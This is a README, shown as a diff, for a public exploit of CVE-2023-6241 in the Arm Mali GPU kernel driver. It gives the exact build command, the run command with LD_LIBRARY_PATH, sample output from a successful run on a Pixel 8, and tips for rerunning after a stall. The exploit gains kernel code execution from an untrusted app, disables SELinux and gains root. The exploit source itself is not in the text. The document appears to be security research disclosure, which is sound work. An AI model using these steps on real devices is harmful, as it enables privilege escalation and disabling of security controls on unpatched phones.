@@ -1,0 +1,40 @@
+## Exploit for CVE-2023-6241
+
+The write up can be found [here](https://github.blog/2024-03-18-gaining-kernel-code-execution-on-an-mte-enabled-pixel-8). This is a bug in the Arm Mali kernel driver that I reported in November 2023. The bug can be used to gain arbitrary kernel code execution from the untrusted app domain, which is then used to disable SELinux and gain root.
+
+The exploit is tested on the Google Pixel 8 with the Novmember 2023 patch (`UD1A.231105.004`). It needs to be compiled with OpenCL and linked with the OpenCL library `libGLES_mali.so`. The library can be found in a Pixel 8 device in `vendor/lib64/egl/libGLES_mali.so` and the OpenCL header files can be found in the KhronosGroup's [OpenCL-headers repository](https://github.com/KhronosGroup/OpenCL-Headers). The specific header that I used was the [v2023.04.17](https://github.com/KhronosGroup/OpenCL-Headers/releases/tag/v2023.04.17) version, although other versions should also work. For reference, I used the following command to compile with clang in ndk-26:
+
+```
+android-ndk-r26b/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android34-clang -DSHELL -DCL_TARGET_OPENCL_VERSION=300 -I. -L. mali_jit_csf.c mem_read_write.c mempool_utils.c -lGLES_mali -o mali_jit_csf
+```
+
+The exploit needs to be linked to `libGLES_mali.so`. This can be done by setting the `LD_LIBRARY_PATH` to `/vendor/lib64/egl`. The exploit rarely fails and even if it does, it does not normally corrupt or crash the system. So in case it fails, it can be rerun. If successful, it should disable SELinux and gain root.
+
+```
+shiba:/data/local/tmp $ LD_LIBRARY_PATH=/vendor/lib64/egl ./mali_jit_csf                                     
+mali_fd 3
+corrupted_jit_addr 6000001000
+kernel success
+kernel success
+queue kernel
+jit_grow addr 6000001000
+Size after grow: 22f6
+Final grow size: 23c7
+keep alive jit_addr 60023d1000
+Size after free: 21fd, trim_level 6
+writing to gpu_va 6002301000
+found reused page 5fffef6000, 0
+pgd entry found at index 0 40000899bbc443
+overwrite addr : 5ffff00b50 b50
+overwrite addr : 5fffb00b50 b50
+overwrite addr : 5fff900b50 b50
+overwrite addr : 5ffff00714 714
+overwrite addr : 5fffb00714 714
+overwrite addr : 5fff900714 714
+result 50
+clean up
+```
+
+When running the first time, the exploit sometimes stalls after printing the last `overwrite addr` message. If that happens (stalled for more than 10 seconds, though pausing for a few seconds is normal), then simply kill the exploit and rerun it. It should not stall the second time.
+
+To test it with MTE enabled, follow [these instructions](https://outflux.net/blog/archives/2023/10/26/enable-mte-on-pixel-8/) to enable kernel MTE.
